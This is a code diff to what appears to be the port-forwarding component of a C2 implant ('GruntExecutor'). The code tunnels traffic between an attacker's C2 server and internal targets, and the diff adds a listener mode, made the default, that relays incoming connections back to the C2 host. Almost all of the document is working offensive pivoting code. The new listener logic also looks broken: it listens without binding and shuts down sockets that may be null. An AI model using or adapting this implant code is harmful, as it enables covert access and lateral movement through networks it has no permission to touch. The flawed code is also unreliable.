@@ -48,7 +48,7 @@ namespace GruntExecutor
             public class handleClient
             {
                 Socket sockC2;
-                Socket sockTarget;
+                Socket sockRoute;
                 string bind_port;
 
                 public List<byte[]> bytesFromC2 = new List<byte[]>();
@@ -63,13 +63,12 @@ namespace GruntExecutor
 
                 bool targetslock = false;
 
-                public void startClient(Socket sockC2, Socket sockTarget, string bind_port, IPEndPoint remote_target)
+                public void startClient(Socket sockC2, Socket sockRoute, string bind_port)
                 {
                     this.sockC2 = sockC2;
-                    this.sockTarget = sockTarget;
+                    this.sockRoute = sockRoute;
                     this.bind_port = bind_port;
-                    this.remotetarget = remote_target;
-                    Thread ctThread = new Thread(() => doChat(bind_port, sockC2, sockTarget, remote_target));
+                    Thread ctThread = new Thread(() => doChat(bind_port, sockC2, sockRoute));
                     ctThread.Start();
                 }
 
@@ -202,11 +201,12 @@ namespace GruntExecutor
                     }
                 }
 
-                public void doChat(string bind_port, Socket sock_c2, Socket sock_target, IPEndPoint remote_target)
+                public void doChat(string bind_port, Socket sock_c2, Socket sock_route)
                 {
+                    
                     Thread keep_reading_from_C2 = new Thread(() => asyncRead(sock_c2, 0, bind_port));
-                    Thread keep_writing_to_Target = new Thread(() => asyncWrite(sock_target, 0, bind_port));
-                    Thread keep_reading_from_Target = new Thread(() => asyncRead(sock_target, 1, bind_port));
+                    Thread keep_writing_to_Target = new Thread(() => asyncWrite(sock_route, 0, bind_port));
+                    Thread keep_reading_from_Target = new Thread(() => asyncRead(sock_route, 1, bind_port));
                     Thread keep_writing_to_C2 = new Thread(() => asyncWrite(sock_c2, 1, bind_port));
                     try
                     {
@@ -233,8 +233,8 @@ namespace GruntExecutor
                                 keep_reading_from_Target = null;
                                 keep_writing_to_C2.Abort();
                                 keep_writing_to_C2 = null;
-                                sock_target.Shutdown(SocketShutdown.Both);
-                                sock_target.Close();
+                                sock_route.Shutdown(SocketShutdown.Both);
+                                sock_route.Close();
                                 sock_c2.Shutdown(SocketShutdown.Both);
                                 sock_c2.Close();
                                 break;
@@ -252,8 +252,9 @@ namespace GruntExecutor
                 }
             }
 
+            
 
-            public static void handleData(string c2_ip, string bind_port, string target_port, string target_ip, string rand_port)
+            public static void handleData(string c2_ip, string bind_port, string target_port, string target_ip, string rand_port, int mode)
             {
                 try
                 {
@@ -261,15 +262,36 @@ namespace GruntExecutor
                     states[bind_port] = true;
                     Socket socketC2 = null;
                     Socket socketTarget = null;
+                    //Listener mode
+                    Socket socketListener = null;
+                    Socket socketIncoming = null;
+                    const int listener_mode = 1;
 
                     while (states[bind_port])
                     {
                         try
                         {
+                            
+                            if (mode == listener_mode){
+                                //work with incomming connection
+                                socketListener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
+                                socketListener.Listen(200);
+                                socketIncoming = socketListener.Accept();
+                                //may check where the connction from
+
+                            }else{
+                                //work with target
+                                var target_ip_p = IPAddress.Parse(target_ip);
+                                IPEndPoint remoteTarget = new IPEndPoint(target_ip_p, Convert.ToInt32(target_port));
+                                socketTarget = new Socket(target_ip_p.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                                socketTarget.Connect(remoteTarget);
+                                target_sockets[bind_port].Add(socketTarget);
+                                
+                            }
+                            
+                            //work with c2
                             var c2_ip_p = IPAddress.Parse(c2_ip);
                             IPEndPoint remoteEPC2 = new IPEndPoint(c2_ip_p, Convert.ToInt32(rand_port));
-
-                            // Create a TCP/IP  socket.  
                             socketC2 = new Socket(c2_ip_p.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                             socketC2.Connect(remoteEPC2);
                             String code_to_start = "testingcode";
@@ -277,22 +299,23 @@ namespace GruntExecutor
                             byte[] data_aux = new byte[256];
                             byte[] data = new byte[256];
                             socketC2.Receive(data);
-
                             c2_sockets[bind_port].Add(socketC2);
-                            var target_ip_p = IPAddress.Parse(target_ip);
-                            IPEndPoint remoteTarget = new IPEndPoint(target_ip_p, Convert.ToInt32(target_port));
 
-                            socketTarget = new Socket(target_ip_p.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
-                            socketTarget.Connect(remoteTarget);
-                            target_sockets[bind_port].Add(socketTarget);
+                            //start chat
                             handleClient client = new handleClient();
-                            client.startClient(socketC2, socketTarget, bind_port, remoteTarget);
+                            if (mode == listener_mode){
+                                client.startClient(socketC2, socketIncoming, bind_port);
+                            }else{
+                                client.startClient(socketC2, socketTarget, bind_port);
+                            }
+                        
                         }
                         catch (Exception ef)
                         {
                             Console.WriteLine(ef.Message + ef.StackTrace);
                         }
                     }
+                    
                     socketC2.Shutdown(SocketShutdown.Both);
                     socketC2.Close();
                     socketTarget.Shutdown(SocketShutdown.Both);
@@ -312,7 +335,7 @@ namespace GruntExecutor
                 List<Socket> c2s = new List<Socket>();
                 c2_sockets[bind_port] = c2s;
                 target_sockets[bind_port] = targets;
-                Thread ctThread = new Thread(() => handleData(ip, bind_port, target_port, target_ip, rand_port));
+                Thread ctThread = new Thread(() => handleData(ip, bind_port, target_port, target_ip, rand_port, 1)); //default to mode 1
                 ctThread.Start();
                 portfwds[bind_port] = ctThread;
                 info_list[bind_port] = new List<string>(new string[] { "[+]", bind_port, target_ip, target_port });
